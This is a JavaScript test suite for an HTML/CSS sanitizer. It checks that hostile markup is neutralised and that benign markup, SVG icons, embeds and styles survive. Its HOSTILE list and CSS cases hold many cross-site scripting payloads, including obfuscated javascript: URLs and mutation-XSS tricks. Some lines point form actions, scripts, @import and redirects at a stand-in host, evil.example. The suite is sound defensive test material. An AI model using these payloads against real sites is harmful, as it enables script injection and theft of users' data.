/* node functions/lib/sanitize.test.js — exits 1 on the first failure it lists.
   The hostile markup must come out harmless in both profiles; the benign markup must come out usable. */

const { parseDocument } = require('htmlparser2');
const { sanitizeHtml, sanitizeCss, sanitizeStyleAttribute } = require('./sanitize');

var failures = [], checks = 0;
function ok(cond, label, detail) {
  checks++;
  if (!cond) failures.push(label + (detail ? '\n      ' + detail : ''));
}

function walk(node, visit) {
  (node.children || []).forEach(function (child) {
    if (child.type === 'tag' || child.type === 'script' || child.type === 'style') visit(child);
    walk(child, visit);
  });
}

var NEVER_TAGS = ['script', 'style', 'form', 'meta', 'base', 'link', 'object', 'embed', 'math', 'noscript', 'frame', 'frameset',
  'applet', 'foreignobject'];
var IFRAME_OK = /^https:\/\/(?:www\.youtube\.com\/embed\/|www\.youtube-nocookie\.com\/embed\/|player\.vimeo\.com\/video\/|www\.google\.com\/maps\/embed)/;

/* What must be true of ANY sanitised output, read back with a parser. */
function unsafeThingsIn(html, profile) {
  var found = [];
  walk(parseDocument(html), function (el) {
    var tag = el.name.toLowerCase();
    if (NEVER_TAGS.indexOf(tag) !== -1) found.push('<' + tag + '>');
    if (tag === 'iframe' && (profile !== 'imported' || !IFRAME_OK.test(el.attribs.src || ''))) found.push('<iframe src=' + el.attribs.src + '>');
    if (profile === 'generated' && /^(input|textarea|select)$/.test(tag)) found.push('<' + tag + '>');
    Object.keys(el.attribs).forEach(function (name) {
      var value = String(el.attribs[name]), compact = value.replace(/[\x00-\x20]/g, '').toLowerCase();
      if (/^on/i.test(name)) found.push(tag + '[' + name + ']');
      if (/^(srcdoc|action|formaction|name|http-equiv)$/i.test(name)) found.push(tag + '[' + name + ']');
      if (/^(javascript|vbscript|livescript):/.test(compact)) found.push(tag + '[' + name + '=' + value + ']');
      if (/^data:/.test(compact) && !/^data:image\/(png|jpeg|gif|webp|avif);base64,/.test(compact)) found.push(tag + '[' + name + '=data:…]');
      if (name === 'style' && /javascript:|expression\(|url\((?!["']?(https?:|\/|data:image\/))/.test(compact)) found.push(tag + '[style=' + value + ']');
    });
  });
  return found;
}

var HOSTILE = [
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)">',
  "<img src='x' ONERROR='alert(1)'>",
  '<svg/onload=alert(1)>',
  '<svg onload=alert(1)><circle r=1 /></svg>',
  '<div/onmouseover=alert(1)>x</div>',
  '<a href=javascript:alert(1)>x</a>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href=" \t javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe src="https://evil.example/embed/x"></iframe>',
  '<iframe src="https://www.youtube.com.evil.example/embed/x"></iframe>',
  '<iframe src="https://user@www.youtube.com/embed/x"></iframe>',
  '<iframe src="http://www.youtube.com/embed/x"></iframe>',
  '<form action=//evil.example><input name=email><button formaction=//evil.example>go</button></form>',
  '<form action="javascript:alert(1)"><input type=submit formaction="javascript:alert(1)"></form>',
  '<input type=hidden name=token value=1>',
  '<meta http-equiv=refresh content="0;url=//evil.example">',
  '<base href=//evil.example/>',
  '<link rel=stylesheet href=//evil.example/x.css>',
  '<script>alert(1)',
  '<script src=//evil.example/x.js></script>',
  '<scr<script>x</script>ipt>alert(1)</scr</script>ipt>',
  '<math><mtext><script>alert(1)</script></mtext></math>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>',
  '<svg><style><a title="</style><img src onerror=alert(1)>"></style></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><a><animate attributeName=href values=javascript:alert(1) /><text>x</text></a></svg>',
  '<svg><set attributeName=onmouseover to=alert(1) /></svg>',
  '<svg><use href="https://evil.example/x.svg#a" /></svg>',
  '<svg><script>alert(1)</script></svg>',
  '<style>@import url(//evil.example/x.css);</style>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="width:expression(alert(1))">x</div>',
  '<div style="background:url(\'data:text/html,<script>alert(1)</script>\')">x</div>',
  '<div style="color:red}</style><script>alert(1)</script>">x</div>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<textarea></textarea><img src=x onerror=alert(1)>',
  '<xmp><img src=x onerror=alert(1)></xmp>',
  '<title><img src=x onerror=alert(1)></title>',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<img srcset="javascript:alert(1) 1x">',
  '<video poster="javascript:alert(1)" src="javascript:alert(1)"></video>',
  '<a href="#" data-href="javascript:alert(1)">x</a>',
  '<div data-rv-bind="event.name" onclick=alert(1) contenteditable>x</div>',
  '<details ontoggle=alert(1) open><summary>x</summary></details>',
  '<button onclick="alert(1)" type=submit>x</button>',
  '<!--><img src=x onerror=alert(1)>-->',
  '<![CDATA[<img src=x onerror=alert(1)>]]>',
  '<p>ok</p><img src=x onerror=alert(1)//'
];

['generated', 'imported'].forEach(function (profile) {
  HOSTILE.forEach(function (input) {
    var r = sanitizeHtml(input, { profile: profile });
    var bad = unsafeThingsIn(r.html, profile);
    ok(!bad.length, profile + ': hostile markup is neutralised — ' + input.slice(0, 70), bad.join(', ') + '  ->  ' + r.html);
    ok(sanitizeHtml(r.html, { profile: profile }).html === r.html, profile + ': output is stable when sanitised again — ' + input.slice(0, 70), r.html);
    ok(Array.isArray(r.removed), profile + ': removed is a list');
  });
});

/* Benign markup: [ input, [ substrings the output must contain ], profile or null for both ] */
var BENIGN = [
  ['<section class="hero hero--dark" id="top"><h1 class="t">Summit 2026</h1><p>Two days. <strong>One</strong> room.</p></section>',
    ['<section class="hero hero--dark" id="top">', '<h1 class="t">Summit 2026</h1>', '<strong>One</strong>']],
  ['<div data-rv-section="speakers"><div class="card" data-rv-repeat-template="speakers"><img data-rv-field="photo" src="/img/p.png" alt=""><h4 data-rv-field="n">Speaker Name</h4></div></div>',
    ['data-rv-section="speakers"', 'data-rv-repeat-template="speakers"', 'data-rv-field="photo"', 'src="/img/p.png"', 'alt=""', 'data-rv-field="n"']],
  ['<template data-rv-pristine data-rv-auto-off><article data-rv-item data-rv-id="a1" class="c">x</article></template>',
    ['<template data-rv-pristine data-rv-auto-off>', '<article data-rv-item data-rv-id="a1" class="c">x</article>', '</template>']],
  ['<h2 data-rv-bind="event.name" data-ai-generated="1" data-rv-key="k1">Name</h2><p data-rv-empty data-rv-hidden-empty hidden>none</p>',
    ['data-rv-bind="event.name"', 'data-ai-generated="1"', 'data-rv-key="k1"', 'data-rv-hidden-empty', ' hidden']],
  ['<a class="btn" href="#register" data-register-cta>Register now</a><a href="https://example.com/a?b=1&amp;c=2" target="_blank">Site</a><a href="mailto:a@example.com">Mail</a><a href="tel:+911234">Call</a><a href="/e/x">Page</a>',
    ['href="#register" data-register-cta', 'href="https://example.com/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer"', 'href="mailto:a@example.com"', 'href="tel:+911234"', 'href="/e/x"']],
  ['<svg class="icon" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><defs><linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="#f00"/></linearGradient><clipPath id="c"><rect width="24" height="24"/></clipPath></defs><path d="M5 12h14" stroke-linecap="round"/><circle cx="12" cy="12" r="9" fill="url(#g)" clip-path="url(#c)"/><use href="#g"/></svg>',
    ['<svg class="icon" viewbox="0 0 24 24"', 'stroke="currentColor"', 'stroke-width="2"', 'aria-hidden="true"', '<lineargradient id="g"', 'stop-color="#f00"', '<clippath id="c">', '<path d="M5 12h14" stroke-linecap="round">', 'fill="url(#g)"', 'clip-path="url(#c)"', '<use href="#g">']],
  ['<picture><source srcset="/a.webp 1x, /a@2x.webp 2x" type="image/webp"><img src="https://cdn.example.com/a.jpg" srcset="https://cdn.example.com/a.jpg 800w, https://cdn.example.com/b.jpg 1600w" sizes="(max-width: 600px) 100vw, 50vw" alt="Hall" width="800" height="600" loading="lazy" decoding="async"></picture>',
    ['<source srcset="/a.webp 1x, /a@2x.webp 2x" type="image/webp"', 'src="https://cdn.example.com/a.jpg"', 'https://cdn.example.com/b.jpg 1600w', 'sizes="(max-width: 600px) 100vw, 50vw"', 'alt="Hall"', 'loading="lazy"', 'decoding="async"']],
  ['<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">', ['src="data:image/png;base64,iVBORw0KGgo="']],
  ['<div style="color:#fff;background:linear-gradient(90deg,#000,#333) , url(https://cdn.example.com/bg.jpg);padding:4rem 2rem;--theme-color:#186bf9;font-family:\'Plus Jakarta Sans\',sans-serif">x</div>',
    ['color:#fff', 'linear-gradient(90deg,#000,#333)', 'url(https://cdn.example.com/bg.jpg)', 'padding:4rem 2rem', '--theme-color:#186bf9', 'Plus Jakarta Sans']],
  ['<video src="https://cdn.example.com/v.mp4" poster="/p.jpg" controls muted loop playsinline autoplay></video>',
    ['src="https://cdn.example.com/v.mp4"', 'poster="/p.jpg"', ' controls', ' muted', ' loop', ' playsinline', ' autoplay']],
  ['<table><thead><tr><th colspan="2" scope="col">Day 1</th></tr></thead><tbody><tr><td rowspan="2">09:00</td><td>Keynote</td></tr></tbody></table>',
    ['<th colspan="2" scope="col">', '<td rowspan="2">09:00</td>']],
  ['<details open><summary>When is it?</summary><p>10 December</p></details><button type="button" class="b" aria-expanded="false">Menu</button><time datetime="2026-12-10">10 Dec</time>',
    ['<details open>', '<summary>When is it?</summary>', '<button type="button" class="b" aria-expanded="false">', '<time datetime="2026-12-10">']],
  ['<p>5 &lt; 6 &amp; "quotes" stay text</p>', ['5 &lt; 6 &amp; "quotes" stay text']],
  ['<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315" title="Film" allowfullscreen></iframe>',
    ['<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"', 'sandbox="allow-scripts allow-same-origin allow-presentation"', 'loading="lazy"', 'title="Film"'], 'imported'],
  ['<iframe src="https://www.google.com/maps/embed?pb=!1m18"></iframe><iframe src="https://player.vimeo.com/video/123"></iframe>',
    ['https://www.google.com/maps/embed?pb=!1m18', 'https://player.vimeo.com/video/123'], 'imported'],
  ['<form class="f" action="/submit" method="post"><label for="e">Email</label><input id="e" type="email" name="email" placeholder="you@work.com"><textarea rows="3" placeholder="Message"></textarea><select><option value="a" selected>A</option></select><button type="submit">Send</button></form>',
    ['<div class="f" data-rv-was-form>', '<label for="e">Email</label>', '<input id="e" type="email" placeholder="you@work.com" />', '<textarea rows="3" placeholder="Message">', '<option value="a" selected>A</option>', '<button type="submit">Send</button>'], 'imported'],
  ['<div data-state="open" data-orientation="vertical" data-aos="fade-up">x</div>', ['data-state="open"', 'data-orientation="vertical"', 'data-aos="fade-up"'], 'imported']
];

BENIGN.forEach(function (row) {
  (row[2] ? [row[2]] : ['generated', 'imported']).forEach(function (profile) {
    var r = sanitizeHtml(row[0], { profile: profile });
    row[1].forEach(function (needle) {
      ok(r.html.indexOf(needle) !== -1, profile + ': benign markup survives — ' + needle, r.html);
    });
    ok(!unsafeThingsIn(r.html, profile).length, profile + ': benign output passes the safety read-back — ' + row[0].slice(0, 50), unsafeThingsIn(r.html, profile).join(', '));
    ok(sanitizeHtml(r.html, { profile: profile }).html === r.html, profile + ': benign output is stable — ' + row[0].slice(0, 50), r.html);
  });
});

/* profile differences and the report of what was removed */
(function () {
  var g = sanitizeHtml('<form action="/x"><label>Email</label><input name="e"></form><iframe src="https://www.youtube.com/embed/x"></iframe>', { profile: 'generated' });
  ok(g.html === '<label>Email</label>', 'generated: forms, inputs and every iframe go, their text stays', g.html);
  ok(g.removed.some(function (x) { return x.what === '<iframe>' && x.count === 1; }), 'generated: the removed iframe is reported', JSON.stringify(g.removed));
  var r = sanitizeHtml('<p onclick="a()" onmouseover="b()">x</p><script>1</script><script>2</script>', { profile: 'imported' });
  ok(r.removed.some(function (x) { return x.what === 'event handler attribute' && x.count === 2; }) && r.removed.some(function (x) { return x.what === '<script>' && x.count === 2; }),
    'removed counts each kind', JSON.stringify(r.removed));
  ok(sanitizeHtml('<p>clean</p>', {}).removed.length === 0, 'nothing removed from clean markup');
  ok(sanitizeHtml(null).html === '' && sanitizeHtml(undefined, { profile: 'imported' }).html === '' && sanitizeHtml(42).html === '42', 'non-text input does not throw');
  ok(sanitizeHtml('<a href="x" target="_blank" rel="opener">x</a>').html.indexOf('rel="noopener noreferrer"') !== -1, 'target=_blank always gets rel=noopener noreferrer');
})();

/* CSS */
(function () {
  var cases = [
    ['x{} </style><script>alert(1)</script>', function (o) { return o === ''; }, 'css that tries to close its <style> is refused whole'],
    ['.a{color:red;content:"</style><script>alert(1)</script>"}', function (o) { return o.indexOf('</') === -1 && /color:red/.test(o); }, 'a "</style>" inside a string cannot end the element'],
    ['.a{color:red}<!-- .b{color:blue} -->', function (o) { return o.indexOf('<!--') === -1; }, 'no HTML comment opener survives'],
    ['@import url(//evil.example/x.css); @import "y.css"; .a{color:red}', function (o) { return !/@import/i.test(o) && /\.a\{color:red\}/.test(o.replace(/\s/g, '')); }, '@import is dropped, the rest stays'],
    ['@charset "utf-8"; @namespace svg url(http://www.w3.org/2000/svg); @unknown x { a{b:c} } .a{color:red}', function (o) { return !/@charset|@namespace|@unknown/i.test(o) && /color:red/.test(o); }, '@charset, @namespace and unknown at-rules are dropped'],
    ['.a{background:url(javascript:alert(1));color:red}', function (o) { return !/javascript/i.test(o) && /color:red/.test(o); }, 'url(javascript:) declaration is dropped'],
    ['.a{background:url("  JaVa\tScRiPt:alert(1)")}', function (o) { return !/script/i.test(o); }, 'url("javascript:") in mixed case with whitespace is dropped'],
    ['.a{background:u\\72l(java\\73 cript:alert(1))}', function (o) { return !/alert/.test(o); }, 'escaped url(javascript:) is dropped'],
    ['.a{width:expression(alert(1));width:ex/**/pression(alert(1));color:red}', function (o) { return !/alert/.test(o) && /color:red/.test(o); }, 'expression() is dropped, also when split by a comment'],
    ['.a{behavior:url(x.htc);-moz-binding:url(x.xml#y);color:red}', function (o) { return !/behavior|binding/i.test(o) && /color:red/.test(o); }, 'behavior and -moz-binding are dropped'],
    ['.a{background:url(data:text/html;base64,PHNjcmlwdD4=)}', function (o) { return !/data:/.test(o); }, 'url(data:text/html) is dropped'],
    ['.a{background:url(ftp://x/y.png)} .b{background:url(file:///etc/passwd)}', function (o) { return !/ftp:|file:/.test(o); }, 'url() with another scheme is dropped'],
    ['.a{background:url(https://cdn.example.com/a.png) center/cover, url("/b.png"), url(data:image/png;base64,AAAA)}', function (o) { return /https:\/\/cdn\.example\.com\/a\.png/.test(o) && /\/b\.png/.test(o) && /data:image\/png;base64,AAAA/.test(o); }, 'http(s), root-relative and data:image urls stay'],
    ['@font-face{font-family:"X";src:url(https://fonts.example.com/x.woff2) format("woff2"),url(data:font/woff2;base64,AAAA)}', function (o) { return /@font-face/.test(o) && /x\.woff2/.test(o) && /data:font\/woff2/.test(o); }, '@font-face with http and data:font sources stays'],
    ['@media (max-width:600px){.a{padding:8px}} @supports (display:grid){.g{display:grid}} @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}', function (o) { return /@media \(max-width:600px\)/.test(o) && /@supports/.test(o) && /@keyframes spin/.test(o) && /rotate\(360deg\)/.test(o); }, '@media, @supports and @keyframes stay'],
    ['.a{color:var(--theme-color);font-family:var(--heading-font-family);inset:0;background:color-mix(in srgb,var(--accent-color) 20%,transparent)}', function (o) { return /var\(--theme-color\)/.test(o) && /color-mix\(/.test(o); }, 'variables and modern functions stay'],
    ['.a{color:red', function (o) { return o === '' || /color:red/.test(o); }, 'an unclosed block does not throw'],
    ['}}}{{{', function (o) { return o === ''; }, 'unparseable css gives an empty sheet'],
    ['', function (o) { return o === ''; }, 'empty stays empty']
  ];
  cases.forEach(function (c) {
    var out;
    try { out = sanitizeCss(c[0]); } catch (e) { out = 'THREW ' + e.message; }
    ok(c[1](out), 'css: ' + c[2], JSON.stringify(c[0]) + '  ->  ' + JSON.stringify(out));
    ok(!/<\/|<!--/.test(out), 'css: output can never close a <style> — ' + c[2], out);
  });
  ok(sanitizeStyleAttribute('color:red;background:url(javascript:alert(1));margin:0 !important') === 'color:red;margin:0 !important', 'style attribute: unsafe declaration removed, the rest kept', sanitizeStyleAttribute('color:red;background:url(javascript:alert(1));margin:0 !important'));
  ok(sanitizeStyleAttribute('color:red} body{display:none') === '', 'style attribute: a value that opens another rule is refused', sanitizeStyleAttribute('color:red} body{display:none'));
})();

if (failures.length) {
  console.error(failures.length + ' of ' + checks + ' checks FAILED:\n');
  failures.forEach(function (f) { console.error('  - ' + f + '\n'); });
  process.exit(1);
}
console.log('sanitize: all ' + checks + ' checks passed');
